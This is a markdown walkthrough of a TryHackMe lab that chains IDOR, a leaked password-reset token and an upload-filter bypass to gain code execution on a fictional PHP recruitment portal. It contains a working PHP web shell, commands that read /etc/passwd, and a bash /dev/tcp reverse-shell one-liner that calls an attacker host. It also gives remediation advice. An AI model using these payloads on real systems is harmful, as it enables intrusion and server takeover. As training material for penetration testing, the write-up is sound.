# RecruitX — Guided Web Pentest Walkthrough

A full write-up of TryHackMe's **"Guided Pentest: Web"** room, chaining four vulnerabilities in a fictional recruitment portal (**RecruitX**) — from reconnaissance to full remote code execution on the underlying server.

> **Room:** Guided Pentest: Web — TryHackMe (Jr Penetration Tester → Penetration Testing Foundations path)
> **Target app:** RecruitX v2.4 (LAMP stack — Apache, PHP, MySQL)
> **Duration:** ~60 min
> **Skills:** Recon & enumeration · IDOR · Broken authentication · File upload bypass · Remote code execution
> **Lab IPs used in this write-up:** Target `10.49.141.255` · Attacker (AttackBox) `10.49.142.90` — these are session-specific and will be different (and expired) on every new TryHackMe room instance; swap them for your own machine's IPs when reproducing.

⚠️ **Disclaimer:** This walkthrough documents an intentionally vulnerable training lab (TryHackMe). Every technique here must only be used on systems you own or are explicitly authorized to test. Do not use these steps against real/production systems.

---

## Table of Contents

1. [Scenario](#1-scenario)
2. [Reconnaissance & Enumeration](#2-reconnaissance--enumeration)
3. [Insecure Direct Object Reference (IDOR)](#3-insecure-direct-object-reference-idor)
4. [Weak Password Reset → Admin Takeover](#4-weak-password-reset--admin-takeover)
5. [Admin Panel Access & Upload Filter Bypass](#5-admin-panel-access--upload-filter-bypass)
6. [Remote Code Execution](#6-remote-code-execution)
7. [The Full Attack Chain](#7-the-full-attack-chain)
8. [Remediation Summary](#8-remediation-summary)
9. [Key Takeaways](#9-key-takeaways)

---

## 1. Scenario

You've been hired as a penetration tester for a client running **RecruitX**, an internal recruitment portal where hiring managers post jobs, candidates apply, and admins manage the workflow. The client suspects security issues but doesn't know where. The engagement follows a realistic path:

1. **Reconnaissance and enumeration** — discover what the application exposes
2. **IDOR** — access data belonging to other users
3. **Weak password reset** — take over an account through a flawed reset mechanism
4. **Admin panel access** — escalate from a regular user to an administrator
5. **Remote code execution** — leverage admin functionality to execute commands on the server

Each step builds on the one before it — this is how real engagements usually work: small flaws chained together into a full compromise.

![Room introduction](images/01-introduction.jpg)

---

## 2. Reconnaissance & Enumeration

### 2.1 Port scanning

```bash
nmap -sV -sC -p- 10.49.141.255
```

Results:

| Port | Service | Version |
|---|---|---|
| 22 | SSH | OpenSSH 9.6p1 (Ubuntu) |
| 80 | HTTP | Apache 2.4.58 — **RecruitX** |
| 3306 | MySQL | (unauthorized) |
| 8080 | HTTP | Apache default page |

Four open ports. Port `3306` confirms a MySQL backend — meaning the app likely builds SQL queries, so any weak input handling could lead to SQL-related issues. Port `80` is the actual target.

### 2.2 Fingerprinting the stack

```bash
curl -I http://10.49.141.255
```

```
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: PHPSESSID=...
```

Confirms **Apache + PHP + MySQL** — a classic LAMP stack.

![Nmap scan and header check](images/02-nmap-scan.jpg)

### 2.3 Directory enumeration

```bash
gobuster dir -u http://10.49.141.255 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

Key findings:

| Path | Status | Note |
|---|---|---|
| `/admin` | 301 → login | Admin panel exists, needs credentials |
| `/api` | 301 | API endpoint — often over-exposes data |
| `/reset.php` | 200 | Password reset page |
| `/uploads` | 301 | Upload directory — possible path to RCE |
| `/profile.php`, `/dashboard.php` | 302 | Requires authentication |

![Gobuster results and dashboard](images/03-gobuster-dashboard.jpg)

### 2.4 Registering an account

Created a test account at `/register.php` and logged in at `/login.php`, landing on `/dashboard.php` as a normal **candidate** user.

### 2.5 Exploring the API

```bash
curl http://10.49.141.255/api/
```

```json
{"endpoints":["/api/user","/api/jobs","/api/applications"]}
```

The API helpfully lists its own endpoints — an information disclosure issue on its own, and a lead for the next step.

---

## 3. Insecure Direct Object Reference (IDOR)

### 3.1 Spotting the pattern

Viewing your own profile shows:

```
http://10.49.141.255/profile.php?id=6
```

The app references profiles by a plain numeric `id`. The obvious test: what happens if we change it?

### 3.2 Exploiting it

```bash
curl http://10.49.141.255/profile.php?id=1
```

Result: full profile of **Sarah Mitchell**, role `administrator`, email `s.mitchell@recruitx.thm` — with **no ownership check** performed by the server.

![IDOR via profile.php reveals the administrator](images/04-idor-profile.jpg)

### 3.3 Confirming via session cookie + checking the API too

```bash
curl -s -b "PHPSESSID=<your_session_cookie>" "http://10.49.141.255/profile.php?id=1"
```

The `/api/user` endpoint has the **same flaw**, and doesn't even require a session cookie:

```bash
curl -s "http://10.49.141.255/api/user?id=1"
# {"id":1,"name":"Sarah Mitchell","email":"s.mitchell@recruitx.thm","role":"administrator", ...}

curl -s "http://10.49.141.255/api/user?id=2"
# {"id":2,"name":"James Crawford","email":"j.crawford@recruitx.thm","role":"hiring_manager", ...}
```

By incrementing `id`, **every user in the system can be enumerated** — including the administrator's name and email.

![Extracting the session cookie and enumerating users via the API](images/05-idor-api-enum.jpg)

**Why it matters:** IDOR is one of the most common web flaws. It happens because developers assume users will only ever request their own resources — an assumption that breaks the moment a URL parameter is changed. The fix: verify server-side that the authenticated user is actually authorized to access the requested object.

---

## 4. Weak Password Reset → Admin Takeover

Now that we know the administrator's email (`s.mitchell@recruitx.thm`), the next objective is account takeover — without brute-forcing a password directly.

### 4.1 Understanding the flow

`/reset.php` asks only for an email address. Testing it with our own account revealed the first major flaw: **the reset token is displayed directly in the HTTP response**, instead of only being emailed to the account owner.

### 4.2 Analysing the token

Generating a few tokens for our own account showed a pattern:

| Attempt | Token |
|---|---|
| 1 | `784512` |
| 2 | `291037` |
| 3 | `503648` |

All tokens are **6-digit numbers** — a keyspace of only 1,000,000 possible values, and no rate-limiting in place.

### 4.3 Exploiting it for the admin account

Requesting a reset for `s.mitchell@recruitx.thm` returned the token directly in the response:

```
Reset URL: /reset.php?token=103628&email=s.mitchell%40recruitx.thm
```

Using that URL, we set a new password for Sarah Mitchell's account and logged in — now authenticated as **administrator**.

![Weak token generation and resetting the admin's password](images/06-weak-password-reset.jpg)

### 4.4 What went wrong

1. **Token displayed in response** — should only ever be sent to the account owner's email.
2. **Weak token generation** — a 6-digit numeric token has a small keyspace and is brute-forceable.
3. **No rate limiting** — the app never limited reset requests or token guesses.

Neither the IDOR nor the weak reset alone gave full access — chained together, they were devastating.

---

## 5. Admin Panel Access & Upload Filter Bypass

### 5.1 Exploring the admin dashboard

Logged in as Sarah Mitchell, `/admin` exposes several management pages. One stands out: **`/admin/upload.php`** — a file upload feature in the hands of an admin is a potential path to RCE.

![Admin upload page](images/07-admin-upload-page.jpg)

### 5.2 Inspecting the upload form

Inspecting the HTML shows:

```html
<input type="file" name="document" accept=".pdf,.docx,.jpg,.png" required>
```

The `accept` attribute is a **client-side restriction only** — a direct HTTP request can send any file type it wants, and files are stored at `/uploads/documents/`.

### 5.3 Testing the restriction

```bash
echo "This is a test file" > test.txt
```

Uploading `test.txt` directly (after removing the `accept` attribute via DevTools) still gets **rejected** — so there is some server-side validation. The next question: does it check content, or just the extension?

```bash
echo '<?php echo "PHP is executing"; ?>' > test.php
```

`.php` is also rejected — the extension is blocklisted.

### 5.4 Bypassing the blocklist

```bash
echo '<?php echo "PHP is executing"; ?>' > test.phtml
```

**`.phtml` is accepted.** Apache still executes it as PHP, but the developer's blocklist only accounted for `.php` — a classic incomplete-blocklist oversight.

```
File uploaded successfully: /uploads/documents/test.phtml
```

Visiting `http://10.49.141.255/uploads/documents/test.phtml` confirms the code executes:

```
PHP is executing
```

![.phtml bypass confirmed — server executes the uploaded PHP file](images/08-upload-bypass-phtml.jpg)

---

## 6. Remote Code Execution

### 6.1 Creating a web shell

```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

Saved as `shell.phtml` and uploaded via the same bypass.

### 6.2 Executing commands

```bash
curl "http://10.49.141.255/uploads/documents/shell.phtml?cmd=whoami"
# <pre>www-data</pre>

curl "http://10.49.141.255/uploads/documents/shell.phtml?cmd=id"
# <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```

Commands run as `www-data`, the default Apache user on Ubuntu.

### 6.3 Reading sensitive files

```bash
curl "http://10.49.141.255/uploads/documents/shell.phtml?cmd=cat+/etc/passwd"
```

Confirms system user enumeration is possible — in a real engagement this could lead to finding database credentials in config files.

### 6.4 Upgrading to a reverse shell

Listener on the attack box:

```bash
nc -lvnp 4444
```

Trigger via the web shell (URL-encoded payload to survive special characters):

```bash
curl "http://10.49.141.255/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.49.142.90/4444+0>%261'"
```

Back on the listener:

```
Connection received on CONNECTION_IP 48268
www-data@example-hostname:/var/www/html/uploads/documents$ whoami
www-data
```

Full interactive shell obtained.

### 6.5 Reading the flag

```bash
cat /var/www/flag.txt
```

![Web shell, command execution, and reverse shell](images/09-rce-reverse-shell.jpg)

---

## 7. The Full Attack Chain

| # | Step | Finding |
|---|---|---|
| 1 | **Enumeration** | Discovered tech stack, directory structure, an API endpoint, a reset page, an uploads directory, and an admin panel |
| 2 | **IDOR** | `/profile.php?id=` and `/api/user?id=` allowed enumerating all users, including the admin's name and email |
| 3 | **Weak password reset** | Reset tokens were displayed in the response, letting us generate and use a valid token for the admin account |
| 4 | **Admin panel access** | Using the compromised admin account, found a file upload function with an incomplete extension blocklist |
| 5 | **Remote code execution** | Uploaded a PHP web shell using the `.phtml` bypass → command execution → reverse shell |

No single vulnerability led to full compromise on its own — the IDOR leaked information but gave no direct access, the reset flaw was only useful because the admin's email was already known, and the upload bypass needed admin credentials to even be reachable. **It was the chain that mattered.**

![Attack chain summary and remediation table](images/10-attack-chain-remediation.jpg)

---

## 8. Remediation Summary

| Vulnerability | Severity | Remediation |
|---|---|---|
| IDOR on user profiles and API | **High** | Implement server-side authorization checks on every request. Verify the authenticated user has permission to access the requested resource. |
| Password reset token exposed in response | **Critical** | Send reset tokens only via email. Show a generic confirmation message on-screen. Use cryptographically random tokens of at least 32 characters. |
| Incomplete file extension blocklist | **Critical** | Use an allowlist, not a blocklist. Validate file content (MIME type) in addition to the extension. Store uploaded files outside the web root. |
| API endpoint disclosure | **Medium** | Remove or restrict the API index endpoint to authenticated administrators. Don't expose internal route structures to unauthenticated users. |

---

## 9. Key Takeaways

- **Enumeration is everything.** Every vulnerability exploited here was discoverable because the app's structure, headers, endpoints, and behaviour were mapped first.
- **Small flaws chain into big compromises.** IDOR, weak password resets, and upload bypasses are all well-understood vulnerability classes — their impact came from how they connected to each other.
- **Client-side restrictions are not security.** The `accept` attribute on the upload form was trivially bypassed; only server-side validation counts.
- **Password reset mechanisms deserve careful design.** A single flaw — exposing the token in the response — was enough to enable full account takeover.
- **Think like an attacker, report like a consultant.** Finding vulnerabilities is half the job; documenting them clearly with severity ratings and actionable remediation is what makes an engagement valuable.

---

## Tooling Used

- `nmap` — port scanning & service detection
- `gobuster` — directory/file enumeration
- `curl` — manual HTTP requests and API testing
- Browser DevTools — inspecting client-side restrictions, cookies
- `netcat` — reverse shell listener

## Credits

Walkthrough based on the **"Guided Pentest: Web"** room by TryHackMe (Jr Penetration Tester path). All testing was performed against the room's own disposable lab machine, as intended by the room design.
